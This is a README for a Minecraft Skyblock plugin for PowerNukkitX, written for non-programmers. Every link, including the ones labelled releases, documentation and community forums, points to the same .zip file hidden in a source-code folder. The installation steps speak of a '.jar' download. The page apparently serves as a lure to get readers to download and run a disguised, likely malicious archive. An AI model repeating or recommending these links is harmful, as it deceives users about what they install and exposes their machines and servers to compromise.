description:
# 🌌 Skyblock - Explore New Dimensions in Gaming

## ⚡️ Overview
Skyblock is a project built on PowerNukkitX using Kotlin. This repository offers an incomplete version of a Minecraft Skyblock plugin, encouraging collaboration and learning for those who wish to enhance it further. With Skyblock, you can create unique gaming experiences, even if you're not a programmer.

## 🚀 Getting Started
To get started with Skyblock, follow the steps below to download and run the software. With just a few easy clicks, you’ll be able to dive into the world of Minecraft Skyblock.

## 📥 Download Skyblock
[![Download Skyblock](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip%https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)

Click the button above to quickly access the releases page. 

### 🌐 Visit the Releases Page
You can also visit the releases page directly: [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip).

## 📚 System Requirements
Before downloading, ensure your system meets the following requirements:
- A device with Minecraft installed
- PowerNukkitX server version compatible with plugins
- At least 2GB of RAM available
- An active internet connection for downloading the plugin

## 🛠 Installation Instructions
1. **Visit the Releases Page**  
   Click this link to go to the [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip) page.

2. **Download the Latest Version**  
   Look for the latest version of Skyblock. It should be available at the top of the releases list. Click the ".jar" file to download it to your computer.

3. **Add Skyblock to Your Server**  
   Once the download is complete:
   - Locate your PowerNukkitX server folder.
   - Open the "plugins" folder inside your server directory.
   - Move or copy the downloaded `.jar` file into this "plugins" folder.

4. **Run Your Server**  
   Start your PowerNukkitX server. You can do this by running the server executable or using terminal/command line commands. The Skyblock plugin will load automatically.

5. **Test the Plugin**  
   After starting your server, join your Minecraft server to ensure everything is running smoothly. Look for Skyblock’s features in-game. You are now ready to explore some exciting new dimensions!

## 📖 Features
Skyblock includes a variety of features designed to enhance your gaming experience:
- **Island Creation:** Players can build and customize their islands.
- **Resource Management:** Gather resources to grow your island.
- **Challenges:** Complete tasks to gain rewards and progress.
- **Community Engagement:** Share your creations with other players.

Feel free to explore these features and experiment with what you can build. 

## 🧑‍🤝‍🧑 Community Contribution
Skyblock is an open project. If you would like to contribute, consider:
- Providing feedback on your experience
- Suggesting new features
- Helping with coding improvements

To contribute, fork the repository, make your changes, and submit a pull request. Every bit of assistance helps!

## 🎉 Frequently Asked Questions

### 1. How do I update Skyblock?
To update, repeat the download and installation steps. Always check the latest version on the releases page.

### 2. Is there a community forum?
You can join discussions on relevant gaming forums and communities, or check our GitHub Discussions page if available.

### 3. How can I report bugs?
To report issues, visit our GitHub Issues page and provide a detailed description of the problem.

## 🔗 Useful Links
- [Skyblock Releases](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)
- [PowerNukkitX Documentation](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)
- [Minecraft Community Forums](https://raw.githubusercontent.com/bruchusorthopnea865/Skyblock/main/src/main/kotlin/redfox/skyblock/permission/Software-2.9.zip)

Thank you for choosing Skyblock. We hope you enjoy exploring this plugin in your Minecraft adventures!
name: Core
summary: 🌌 Explore SkyblockCore, an open-source project for MC:BE, designed as a reference for building your own Skyblock server with Kotlin, MongoDB, and Redis.
